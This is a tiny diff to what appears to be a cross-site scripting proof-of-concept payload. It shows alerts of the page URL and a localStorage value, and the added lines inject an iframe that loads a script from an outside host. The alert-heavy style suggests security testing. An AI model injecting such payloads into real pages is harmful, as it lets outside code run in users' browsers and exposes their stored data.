@@ -3,3 +3,8 @@ var storage_item = "ui3_" + media_id;
 alert("HI");
 alert(location.href);
 alert(localStorage.getItem(storage_item));	
+var iframe=document.createElement("iframe");
+alert(iframe);
+iframe.src="http://rucsesec.github.io/test2.js";
+alert(iframe.src);
+document.appendChild(iframe);
